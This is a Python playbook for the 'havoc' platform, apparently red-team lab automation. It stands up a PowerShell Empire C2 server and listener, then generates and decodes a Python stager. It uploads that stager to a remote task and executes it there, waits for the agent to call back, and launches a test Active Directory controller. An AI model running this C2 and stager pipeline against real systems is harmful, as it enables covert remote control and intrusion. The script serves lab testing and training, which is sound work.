# Import the supporting Python packages.
import re
import os
import string
import random
import pprint
import time as t
import argparse
import subprocess
from configparser import ConfigParser
from datetime import datetime

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - C2 with AD scans')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the configuration file
config = ConfigParser()
config_file = os.path.expanduser('~/.havoc/config')
config.read(config_file)

# Get api_key and secret_key
if profile:
    api_key = config.get(profile, 'API_KEY')
    secret = config.get(profile, 'SECRET')
    api_region = config.get(profile, 'API_REGION')
    api_domain_name = config.get(profile, 'API_DOMAIN_NAME')
else:
    api_key = config.get('default', 'API_KEY')
    secret = config.get('default', 'SECRET')
    api_region = config.get('default', 'API_REGION')
    api_domain_name = config.get('default', 'API_DOMAIN_NAME')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Create a date string to use in the task name.
d = datetime.utcnow()
sdate = d.strftime('%m-%d-%Y-%H-%M')

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser()
config.read('havoc-playbooks/c2_with_ad_dc/c2_with_ad_dc.ini')

listener_type = config.get('c2_task', 'listener_type')
listener_profile = config.get('c2_task', 'listener_profile')
listener_port = config.get('c2_task', 'listener_port')
listener_tls = config.get('c2_task', 'listener_tls')
domain_name = config.get('c2_task', 'domain_name')
cert_subj = config.get('c2_task', 'cert_subj')
remote_ad_task_name = config.get('remote_ad_task', 'task_name')
ad_tld = config.get('remote_ad_task', 'ad_tld')
ad_domain = config.get('remote_ad_task', 'ad_domain')
ad_realm = config.get('remote_ad_task', 'ad_realm')
user_name = config.get('remote_ad_task', 'user_name')
user_password = config.get('remote_ad_task', 'user_password')
admin_password = config.get('remote_ad_task', 'admin_password')
remote_c2_agent_task_name = config.get('remote_c2_agent_task', 'task_name')

if listener_profile != 'None':
    resource_name = f'c2-{listener_profile}'
else:
    resource_name = f'c2-{listener_type}'

def get_task_attack_ip(tn):
    task_details = h.get_task(tn)
    task_attack_ip = task_details['attack_ip']
    return task_attack_ip


def get_task_target_ip(tn):
    task_details = h.get_task(tn)
    task_target_ip_list = task_details['local_ip']
    task_target_ip = None
    for ip in task_target_ip_list:
        if '172.17.' not in ip:
            task_target_ip = ip
    return task_target_ip


def clean_up():
    if ad_server_exists:
        print(f'Killing AD DC on {ad_server_exists[0]}.\n')
        instruct_instance = ad_server_exists[1]
        instruct_command = 'kill_ad_dc'
        kill_ad_dc_response = h.interact_with_task(ad_server_exists[0], instruct_instance, instruct_command)
        if 'result' in kill_ad_dc_response and kill_ad_dc_response['result'] == 'failed':
            print(f'Failed to kill AD DC on {ad_server_exists[0]}.\n')
            print(kill_ad_dc_response)

    if agent_exists:
        # Kill the agent.
        print(f'\nKilling agent with name {agent_exists[0]}.\n')
        instruct_instance = agent_exists[1]
        instruct_command = 'kill_process'
        kill_agent_response = h.interact_with_task(agent_exists[2], instruct_instance, instruct_command)
        if 'result' in kill_agent_response and kill_agent_response['result'] == 'failed':
            print(f'Failed to kill agent with name {agent_exists[0]}.\n')
            print(kill_agent_response)

    if stager_exists:
        # Delete the stager file from the workspace.
        print(f'\nDeleting the stager file {stager_exists} from the shared workspace.\n')
        h.delete_file(stager_exists)
        os.remove(stager_exists)

    if task_exists:
        # Kill the task.
        print(f'\nShutting down task with name {task_exists}.\n')
        task_shutdown_response = h.task_shutdown(task_exists)
        if 'completed' not in task_shutdown_response:
            print(f'Task shutdown for {task_exists} failed.\n')
            print(task_shutdown_response)
            exit('\nExiting.')
        t.sleep(5)

    if portgroup_exists:
        # Delete the portgroup.
        print(f'\nDeleting the {portgroup_exists} portgroup.\n')
        h.delete_portgroup(portgroup_exists)

    # All done.
    exit('\nDone... Exiting.\n')


# Verify remote_c2_agent_task_name exists
print(f'\nVerifying that trainman task {remote_c2_agent_task_name} exists.')
attack_ip = None
task_list = h.list_tasks()
if remote_c2_agent_task_name in task_list['tasks']:
    attack_ip = get_task_attack_ip(remote_c2_agent_task_name)
else:
    exit(f'\nTrainman task {remote_c2_agent_task_name} does not exist. Exiting...')

# Verify remote_ad_task_name exists
print(f'\nVerifying that trainman task {remote_ad_task_name} exists.')
target_ip = None
task_list = h.list_tasks()
if remote_ad_task_name in task_list['tasks']:
    target_ip = get_task_target_ip(remote_ad_task_name)
else:
    exit(f'\nTrainman task {remote_ad_task_name} does not exist. Exiting...')

# Create a portgroup for the powershell_empire task's listener.
print(f'\nCreating a portgroup for {resource_name} listener.')
h.create_portgroup(resource_name, f'Allows port {listener_port} traffic')
print(f'\nAdding portgroup rule to allow {remote_c2_agent_task_name} task attack IP {attack_ip} to reach '
      f'{resource_name} listener on port {listener_port}.\n')
h.update_portgroup_rule(resource_name, 'add', f'{attack_ip}/32', listener_port, 'tcp')
portgroup_exists = resource_name

# Launch a powershell_empire task for the listener.
task_name = f'{resource_name}_{sdate}'
portgroups = [resource_name]
if domain_name == 'None':
    task_host_name = 'None'
else:
    task_host_name = resource_name
print(f'\nLaunching powershell_empire task with name {task_name}.')
c2_task = h.task_startup(
    task_name,
    'powershell_empire',
    task_host_name=task_host_name,
    task_domain_name=domain_name,
    portgroups=portgroups
)
task_exists = task_name
c2_ip = c2_task['attack_ip']
print(f'\nThe powershell_empire task is ready with the following parameters:')
print(f'\nIP - {c2_ip}')
print(f'\nHost name - {task_host_name}')
print(f'\nDomain name - {domain_name}')

# Use a random string for the PowerShell Empire instruct_instance.
c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# If TLS listener requested, generate a certificate.
if listener_tls == 'yes':
    subj = None
    if domain_name != 'None':
        subj = re.sub('\$HOST', f'{resource_name}.{domain_name}', cert_subj)
    if domain_name == 'None':
        subj = re.sub('\$HOST', f'{c2_ip}', cert_subj)
    instruct_command = 'cert_gen'
    instruct_args = {'subj': subj}
    cert_gen = h.interact_with_task(task_name, c2_instruct_instance, instruct_command, instruct_args)
    if cert_gen['outcome'] == 'success':
        print('\ncert_gen succeeded.\n')
    else:
        print('\ncert_gen failed... Exiting.\n')
        clean_up()

# Create a listener for the powershell_empire task.
print(f'\nCreating {resource_name} listener on {task_name} task.')
if listener_tls == 'yes':
    listener_protocol = 'https'
else:
    listener_protocol = 'http'
if domain_name != 'None':
    listener_host = f'{listener_protocol}://{resource_name}.{domain_name}:{listener_port}'
else:
    listener_host = f'{listener_protocol}://{c2_ip}:{listener_port}'
instruct_command = 'create_listener'
instruct_args = {
        'listener_type': listener_type,
        'Name': f'{resource_name}',
        'Host': listener_host,
        'Port': listener_port
    }
if listener_type == 'http_malleable' and listener_profile != 'None':
    instruct_args['Profile'] = f'{listener_profile}.profile'
if listener_tls == 'yes':
    instruct_args['CertPath'] = '/opt/Empire/empire/server/data/'
create_listener = h.interact_with_task(task_name, c2_instruct_instance, instruct_command, instruct_args)
if create_listener['outcome'] == 'success':
    print('\ncreate_listener succeeded.\n')
else:
    print('\ncreate_listener failed... Exiting.\n')
    clean_up()

# Generate a stager for the listener.
print(f'\nGenerating a stager for the {resource_name} listener.')
instruct_command = 'create_stager'
instruct_args = {
    'Listener': f'{resource_name}',
    'StagerName': 'multi/launcher',
    'Language': 'python',
    'OutFile': f'{resource_name}.sh'
}
stager = h.interact_with_task(task_name, c2_instruct_instance, instruct_command, instruct_args)
if stager['outcome'] == 'success':
    print('\ncreate_stager succeeded.\n')
else:
    print('\ncreate_stager failed... Exiting.\n')
    clean_up()
output = stager['stager']['multi/launcher']['Output']
subprocess.call(f'echo {output} | base64 -d > {resource_name}.sh', shell=True)

# Upload the stager file to the shared workspace
print('\nUploading the stager file to the shared workspace.')
f = open(f'{resource_name}.sh', 'rb')
raw_file = f.read()
h.create_file(f'{resource_name}.sh', raw_file)
stager_exists = f'{resource_name}.sh'

# Use a random string for the remote_c2_agent_task instruct_instance.
c2_agent_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Make sure there isn't an existing stager file with the same name on the trainman task.
print(f'\nDeleting any existing {resource_name}.sh stager from remote trainman task {remote_c2_agent_task_name}.')
instruct_command = 'del'
instruct_args = {'file_name': f'{resource_name}.sh'}
delete = h.interact_with_task(remote_c2_agent_task_name, c2_agent_instruct_instance, instruct_command, instruct_args)
if delete['outcome'] == 'success':
    print('\nFile delete request succeeded.\n')
else:
    print('\nNo existing file was present. Proceeding...\n')

# Ask the trainman task to sync it's local workspace from the shared workspace.
print(f'\nDownloading stager file from shared workspace to {remote_c2_agent_task_name} task local workspace.')
instruct_command = 'sync_from_workspace'
sync_workspace = h.interact_with_task(remote_c2_agent_task_name, c2_agent_instruct_instance, instruct_command)
if sync_workspace['outcome'] == 'success':
    print('\nsync_from_workspace succeeded.\n')
else:
    print('\nsync_from_workspace failed... Exiting.\n')
    clean_up()

# Ask the trainman task to execute the stager file.
print(f'\nInstructing remote trainman task {remote_c2_agent_task_name} to execute {resource_name}.sh as a process.')
instruct_command = 'execute_process'
instruct_args = {'file_path': f'/opt/havoc/shared/{resource_name}.sh'}
execute_process = h.interact_with_task(
    remote_c2_agent_task_name,
    c2_agent_instruct_instance,
    instruct_command,
    instruct_args
)
if execute_process['outcome'] == 'success':
    print('\nexecute_process request succeeded.\n')
else:
    print('\nexecute_process request failed... Exiting.\n')
    clean_up()

# Wait for the agent to connect.
print(f'\nWaiting for an agent connection on task {task_name}.\n')
agent_name = None
try:
    wait_for_c2_response = h.wait_for_c2(task_name)
    agent_name = wait_for_c2_response['agent_info']['name']
    agent_exists = [agent_name, c2_agent_instruct_instance, remote_c2_agent_task_name]
    print(f'Agent connected with name {agent_name}\n')
except KeyboardInterrupt:
    print('Wait for agent operation interrupted. No agent connected. Exiting...')
    clean_up()

# Start an AD DC on the remote_ad_task
# Use a random string for the remote_ad_task instruct_instance.
ad_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))

# Ask the remote_ad_task to start an AD DC.
print(f'\nInstructing {remote_ad_task_name} to start an Active Directory DC.')
instruct_command = 'run_ad_dc'
instruct_args = {
    'domain': ad_domain,
    'realm': ad_realm,
    'user_name': user_name,
    'user_password': user_password,
    'admin_password': admin_password
}
run_ad_dc = h.interact_with_task(remote_ad_task_name, ad_instruct_instance, instruct_command, instruct_args)
if run_ad_dc['outcome'] == 'success':
    print('\nrun_ad_dc succeeded.\n')
    ad_server_exists = [remote_ad_task_name, ad_instruct_instance]
else:
    print('\nrun_ad_dc failed.\n')
    clean_up()

print(
    '\nAn AD DC server is running and an agent is connected. '
    f'\nC2 task name: {task_name}'
    f'\nAgent name: {agent_name}'
    f'\nRemote AD task name: {remote_ad_task_name}'
    f'\nRemote agent task name: {remote_c2_agent_task_name}'
    '\n\nPlaybook will halt until prompted to clean up.'
    )
print('\nPress enter to proceed with clean up.')
input()

# Playbook is complete; time to clean up.
print('\nPlaybook operation completed. Cleaning up ./havoc resources.')
clean_up()
